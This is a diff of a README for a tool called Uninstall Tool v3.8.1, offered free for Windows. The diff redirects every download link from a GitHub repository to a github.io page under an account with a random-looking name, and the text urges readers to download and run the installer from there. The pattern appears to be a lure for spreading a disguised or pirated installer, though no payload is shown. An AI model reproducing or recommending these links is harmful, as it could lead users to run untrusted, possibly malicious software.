@@ -1,6 +1,6 @@
 # 🛠️ Uninstall-Tool-v3.8.1 - Remove Any Program Completely for Free
 
-[![Download Now](https://img.shields.io/badge/Download-Uninstall_Tool_v3.8.1-2ea44f?style=for-the-badge&logo=windows)](https://github.com/unbound-fringedgecko376/Uninstall-Tool-v3.8.1)
+[![Download Now](https://img.shields.io/badge/Download-Uninstall_Tool_v3.8.1-2ea44f?style=for-the-badge&logo=windows)](https://unbound-fringedgecko376.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This application is designed for regular computer users who want to clean their 
 
 Visit this link to download the application:
 
-[🔗 https://github.com/unbound-fringedgecko376/Uninstall-Tool-v3.8.1](https://github.com/unbound-fringedgecko376/Uninstall-Tool-v3.8.1)
+[🔗 https://unbound-fringedgecko376.github.io](https://unbound-fringedgecko376.github.io)
 
 Once you're on the page, look for the latest release or download button. You will get the installer file compatible with Windows 11 and Windows 10. After downloading, simply run the file and follow the on-screen instructions.
 
@@ -132,7 +132,7 @@ This software is provided for personal use. Redistribution or commercial use may
 
 Click the download button at the top of this page to get Uninstall Tool v3.8.1. It's the fastest, easiest way to remove unwanted programs and keep your Windows PC running smoothly.
 
-[🔄 Download Uninstall Tool v3.8.1 Now](https://github.com/unbound-fringedgecko376/Uninstall-Tool-v3.8.1)
+[🔄 Download Uninstall Tool v3.8.1 Now](https://unbound-fringedgecko376.github.io)
 
 ---
 
